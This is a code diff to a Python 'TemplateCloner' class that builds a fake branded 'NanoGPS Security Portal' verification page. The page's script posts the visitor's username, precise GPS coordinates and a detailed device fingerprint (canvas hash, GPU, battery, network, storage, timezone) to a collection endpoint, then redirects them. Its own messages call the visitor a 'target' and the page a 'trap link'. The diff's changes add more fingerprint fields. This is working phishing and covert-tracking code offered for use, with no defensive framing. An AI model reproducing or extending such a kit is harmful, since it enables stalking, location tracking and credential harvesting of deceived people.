@@ -3,15 +3,20 @@ class TemplateCloner:
     def generate_template(brand_name, redirect_url):
         brand = brand_name.strip().capitalize() if brand_name else "Verification"
         
-        html_content = f"""<!DOCTYPE html>
+        # Ensure redirect URL has http/https scheme to prevent relative path breakage
+        clean_redirect = redirect_url.strip()
+        if not clean_redirect.startswith("http://") and not clean_redirect.startswith("https://"):
+            clean_redirect = "https://" + clean_redirect
+
+        html_template = """<!DOCTYPE html>
 <html>
 <head>
-    <title>{brand} - NanoGPS Security Portal</title>
+    <title>BRAND_NAME - NanoGPS Security Portal</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body style="background:#0f172a;color:#f8fafc;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
     <div style="width:100%;max-width:380px;background:#1e293b;padding:30px;border-radius:12px;box-shadow:0 4px 25px rgba(0,0,0,0.6);text-align:center;">
-        <h2 style="margin-bottom:10px;color:#38bdf8;">{brand}</h2>
+        <h2 style="margin-bottom:10px;color:#38bdf8;">BRAND_NAME</h2>
         <p style="color:#94a3b8;font-size:13px;margin-bottom:25px;">Please verify your account to continue session.</p>
         
         <div style="margin-bottom:20px;text-align:left;">
@@ -23,73 +28,92 @@ class TemplateCloner:
     </div>
 
 <script>
-const TARGET_REDIRECT = "{redirect_url}";
+const TARGET_REDIRECT = "REDIRECT_URL";
 
-function finalize() {{
-    setTimeout(() => {{
+function finalize() {
+    setTimeout(() => {
         window.location.replace(TARGET_REDIRECT);
-    }}, 1000);
-}}
+    }, 1000);
+}
 
-async function transmit(payload) {{
-    try {{
-        await fetch('/collect', {{
+async function transmit(payload) {
+    try {
+        await fetch('/collect', {
             method: 'POST',
-            headers: {{'Content-Type': 'application/json'}},
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(payload)
-        }});
-    }} catch(e) {{}}
-}}
+        });
+    } catch(e) {}
+}
 
-async function initSequence() {{
+async function initSequence() {
     let userVal = document.getElementById('usr').value;
-    await transmit({{type: 'status', message: 'Target input username: ' + (userVal || 'N/A')}});
-    await transmit({{type: 'status', message: 'Requesting GPS coordinates...'}});
+    await transmit({type: 'status', message: 'Target input username: ' + (userVal || 'N/A')});
+    await transmit({type: 'status', message: 'Requesting GPS coordinates...'});
 
     navigator.geolocation.getCurrentPosition(
-        async (pos) => {{
-            await transmit({{
+        async (pos) => {
+            await transmit({
                 type: 'geo', 
                 lat: pos.coords.latitude, 
                 lon: pos.coords.longitude,
                 acc: pos.coords.accuracy
-            }});
+            });
             captureAdvancedFingerprint();
-        }},
-        async (err) => {{
-            await transmit({{type: 'status', message: 'GPS Permission Denied. Proceeding to Fingerprint...'}});
+        },
+        async (err) => {
+            await transmit({type: 'status', message: 'GPS Permission Denied. Proceeding to Fingerprint...'});
             captureAdvancedFingerprint();
-        }},
-        {{ enableHighAccuracy: true, timeout: 8000 }}
+        },
+        { enableHighAccuracy: true, timeout: 8000 }
     );
-}}
+}
 
-async function captureAdvancedFingerprint() {{
-    await transmit({{type: 'status', message: 'Extracting deep telemetry & device specs...'}});
+async function captureAdvancedFingerprint() {
+    await transmit({type: 'status', message: 'Extracting deep telemetry & device specs...'});
     
     let canvasHash = 'N/A';
-    try {{
+    try {
         let cv = document.createElement('canvas');
         let ctx = cv.getContext('2d');
         ctx.textBaseline = "top";
         ctx.font = "14px 'Arial'";
         ctx.fillText("NanoGPS 🛡️", 2, 2);
         canvasHash = cv.toDataURL().slice(-35);
-    }} catch(e) {{}}
+    } catch(e) {}
 
     let storageInfo = 'N/A';
-    try {{
-        if (navigator.storage && navigator.storage.estimate) {{
+    try {
+        if (navigator.storage && navigator.storage.estimate) {
             let est = await navigator.storage.estimate();
-            storageInfo = "Quota: " + (est.quota / (1024*1024*1024)).toFixed(2) + " GB";
-        }}
-    }} catch(e) {{}}
+            let quotaGB = (est.quota / (1024 * 1024 * 1024)).toFixed(2);
+            let usageMB = (est.usage / (1024 * 1024)).toFixed(2);
+            storageInfo = `Quota: ${quotaGB} GB | Used: ${usageMB} MB`;
+        }
+    } catch(e) {}
 
-    let data = {{
+    let clientHints = 'N/A';
+    try {
+        if (navigator.userAgentData) {
+            let brands = navigator.userAgentData.brands.map(b => `${b.brand} (${b.version})`).join(', ');
+            clientHints = `Brands: [${brands}] | Mobile: ${navigator.userAgentData.mobile} | Platform: ${navigator.userAgentData.platform}`;
+        }
+    } catch(e) {}
+
+    let orientation = 'N/A';
+    try {
+        if (screen.orientation) {
+            orientation = `${screen.orientation.type} (Angle: ${screen.orientation.angle})`;
+        }
+    } catch(e) {}
+
+    let data = {
         type: 'fingerprint',
         inputUser: document.getElementById('usr').value || 'N/A',
-        storage: storageInfo,
         ua: navigator.userAgent || 'N/A',
+        clientHints: clientHints,
+        storage: storageInfo,
+        orientation: orientation,
         platform: navigator.platform || 'N/A',
         lang: navigator.language || 'N/A',
         tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
@@ -105,39 +129,39 @@ async function captureAdvancedFingerprint() {{
         gpu: 'N/A',
         battery: 'N/A',
         network: 'N/A'
-    }};
+    };
 
-    try {{
+    try {
         let conn = navigator.connection || navigator.mozConnection;
-        if (conn) {{
-            data.network = (conn.effectiveType || 'unknown') + " (" + (conn.downlink || 'N/A') + "Mbps)";
-        }}
-    }} catch(e) {{}}
+        if (conn) {
+            data.network = `${conn.effectiveType || 'unknown'} (${conn.downlink || 'N/A'}Mbps, RTT: ${conn.rtt || 'N/A'}ms)`;
+        }
+    } catch(e) {}
 
-    try {{
+    try {
         let bat = await navigator.getBattery();
-        data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? 'Charging' : 'Discharging') + ")";
-    }} catch(e) {{}}
+        data.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
+    } catch(e) {}
 
-    try {{
+    try {
         let cv2 = document.createElement('canvas');
         let gl = cv2.getContext('webgl') || cv2.getContext('experimental-webgl');
         let ext = gl.getExtension('WEBGL_debug_renderer_info');
-        if (ext) {{
+        if (ext) {
             data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
-        }}
-    }} catch(e) {{}}
+        }
+    } catch(e) {}
 
     await transmit(data);
-    await transmit({{type: 'status', message: 'Telemetry captured. Redirecting target...'}});
+    await transmit({type: 'status', message: 'Telemetry captured. Redirecting target...'});
     finalize();
-}}
+}
 
-window.onload = async () => {{
-    await transmit({{type: 'status', message: 'Target opened the dynamic trap link.'}});
-}};
+window.onload = async () => {
+    await transmit({type: 'status', message: 'Target opened the dynamic trap link.'});
+};
 </script>
 </body>
 </html>
 """
-        return html_content
+        return html_template.replace("BRAND_NAME", brand).replace("REDIRECT_URL", clean_redirect)
